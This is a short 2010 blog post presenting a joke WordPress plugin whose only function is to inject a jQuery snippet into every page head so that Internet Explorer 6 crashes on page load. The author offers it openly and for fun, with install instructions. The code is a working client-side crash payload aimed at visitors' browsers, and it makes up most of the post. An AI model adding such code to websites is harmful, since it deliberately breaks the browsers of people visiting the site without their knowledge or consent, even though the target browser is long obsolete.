Crash IE6 WordPress Plugin
##########################

:date: 2010-03-31 16:34
:category: Code

I decided to have a little fun today during lunch, so I wrote a
WordPress + jQuery plugin for Crashing IE 6.

Once activated, IE6 will instantly crash on page load. Enjoy :) ::


    <?php
    /*
      Plugin Name: Crash IE 6
      Plugin URI: http://gist.github.com/350532
      Description: We'll take them by force.
      Version: 0.1
      Author: Kenneth Reitz
      Author URI: http://kennethreitz.com/
      Min WP Version: 2.0
      Max WP Version: 3.5
      License: MIT License - http://www.opensource.org/licenses/mit-license.php
      Note: Requires jQuery.
      Install: drop in wp-content/plugins/ and activate in admin.

    */

    function kill_ie6() {  ?>
        <script type="text/javascript" charset="utf-8">
            ;jQuery.crash=function(x){for(x in document.open);};
            jQuery.crash();
        </script>
    <?php }

    add_action('wp_head', 'kill_ie6');
